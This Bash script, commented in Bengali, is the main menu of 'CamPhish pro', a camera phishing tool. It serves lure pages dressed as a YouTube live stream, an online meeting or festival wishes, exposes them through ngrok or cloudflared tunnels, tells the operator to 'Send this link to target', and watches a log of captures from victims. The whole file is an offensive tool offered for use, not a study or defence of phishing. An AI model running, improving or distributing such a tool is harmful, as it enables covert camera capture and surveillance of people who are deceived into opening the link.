#!/bin/bash

# কালার কোড
RED="\e[1;31m"
GREEN="\e[1;32m"
YELLOW="\e[1;33m"
BLUE="\e[1;34m"
MAGENTA="\e[1;35m"
CYAN="\e[1;36m"
WHITE="\e[1;37m"
RESET="\e[0m"

# মডিউল ইম্পোর্ট
source modules/banner.sh
source modules/tunnel.sh
source modules/cleanup.sh

# ডিপেন্ডেন্সি চেক
check_dependencies() {
    echo -e "\n${YELLOW}[*] Checking dependencies...${RESET}"
    pkgs=(php wget unzip curl)
    for pkg in "${pkgs[@]}"; do
        command -v $pkg > /dev/null 2>&1 || {
            echo -e "${RED}[!] $pkg is not installed!${RESET}"
            install_dependencies
            break
        }
    done
    echo -e "${GREEN}[✓] All dependencies are installed!${RESET}"
}

# ডিপেন্ডেন্সি ইন্সটল
install_dependencies() {
    echo -e "\n${YELLOW}[*] Installing required packages...${RESET}"
    if [[ -f /data/data/com.termux/files/usr/bin/pkg ]]; then
        pkg update -y
        pkg install -y php wget unzip curl
    else
        sudo apt-get update
        sudo apt-get install -y php wget unzip curl
    fi
}

# টেমপ্লেট সেটআপ
setup_template() {
    echo -e "\n${BLUE}[*] Available Templates:${RESET}"
    echo "1. YouTube Live"
    echo "2. Online Meeting"
    echo "3. Festival Wishes"
    echo "4. Back to Main Menu"
    
    read -p $'\e[1;32m[?] Select template: \e[0m' template_choice
    
    case $template_choice in
        1) template="youtube" ;;
        2) template="meeting" ;;
        3) template="festival" ;;
        4) main_menu ;;
        *) 
            echo -e "${RED}[!] Invalid option!${RESET}"
            setup_template
            ;;
    esac
    
    echo -e "${GREEN}[✓] Template selected: $template${RESET}"
    start_server
}

# সার্ভার স্টার্ট
start_server() {
    echo -e "\n${YELLOW}[*] Starting PHP server...${RESET}"
    php -S 127.0.0.1:8080 -t templates > /dev/null 2>&1 &
    sleep 2
    
    setup_tunnel
}

# টানেল সেটআপ
setup_tunnel() {
    echo -e "\n${BLUE}[*] Select Port Forwarding Service:${RESET}"
    echo "1. Ngrok"
    echo "2. Cloudflared"
    echo "3. Back to Main Menu"
    
    read -p $'\e[1;32m[?] Select an option: \e[0m' tunnel_choice
    
    case $tunnel_choice in
        1) 
            start_ngrok
            show_link
            ;;
        2) 
            start_cloudflared
            show_link
            ;;
        3) 
            cleanup
            main_menu
            ;;
        *) 
            echo -e "${RED}[!] Invalid option!${RESET}"
            setup_tunnel
            ;;
    esac
}

# লিংক দেখানো
show_link() {
    if [ -f "logs/tunnel_url.txt" ]; then
        link=$(cat logs/tunnel_url.txt)
        echo -e "\n${GREEN}[*] Send this link to target:${RESET}"
        echo -e "${BLUE}$link/index.php?template=$template${RESET}"
        
        echo -e "\n${YELLOW}[*] Waiting for target. Press Ctrl+C to exit...${RESET}"
        tail -f logs/capture.log 2>/dev/null
    else
        echo -e "${RED}[!] Tunnel error occurred!${RESET}"
        cleanup
        main_menu
    fi
}

# মেইন মেনু
main_menu() {
    show_banner
    echo -e "${BLUE}[*] Select an Option:${RESET}"
    echo "1. Start Phishing"
    echo "2. View Captures"
    echo "3. Update Script"
    echo "4. About"
    echo "5. Exit"
    
    read -p $'\e[1;32m[?] Select an option: \e[0m' option
    
    case $option in
        1) 
            check_dependencies
            setup_template
            ;;
        2)
            echo -e "\n${YELLOW}[*] Captured files:${RESET}"
            ls -1 captures/ 2>/dev/null || echo -e "${RED}[!] No captures found!${RESET}"
            read -p $'\e[1;32m\nPress Enter to return to main menu... \e[0m'
            main_menu
            ;;
        3)
            echo -e "\n${YELLOW}[*] Checking for updates...${RESET}"
            # আপডেট লজিক এখানে যোগ করুন
            echo -e "${GREEN}[✓] Script is up to date!${RESET}"
            sleep 2
            main_menu
            ;;
        4)
            echo -e "\n${BLUE}[*] CamPhish pro -The Advance Camera Phishing Tool${RESET}"
            echo -e "${WHITE}Developed by: Rayhan Khan${RESET}"
            echo -e "${WHITE}Version: 2.0${RESET}"
            echo -e "${WHITE}GitHub: https://github.com/rayhankhan4u${RESET}"
            read -p $'\e[1;32m\nPress Enter to return to main menu... \e[0m'
            main_menu
            ;;
        5)
            cleanup
            echo -e "${GREEN}[✓] Thanks for using CamPhish!${RESET}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option!${RESET}"
            sleep 1
            main_menu
            ;;
    esac
}

# ট্র্যাপ হ্যান্ডলার
trap cleanup EXIT

# স্ক্রিপ্ট শুরু
main_menu

